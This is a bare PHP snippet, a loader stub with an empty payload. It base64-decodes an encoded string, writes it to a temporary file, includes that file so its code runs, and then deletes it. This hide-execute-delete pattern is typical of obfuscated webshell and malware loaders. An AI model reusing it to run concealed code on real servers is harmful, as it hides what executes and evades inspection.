<?php $encoded = ''; $decoded_php = base64_decode($encoded);$tmp_file = tempnam(sys_get_temp_dir(), 'decoded_php_');file_put_contents($tmp_file, $decoded_php);include $tmp_file;unlink($tmp_file); ?>
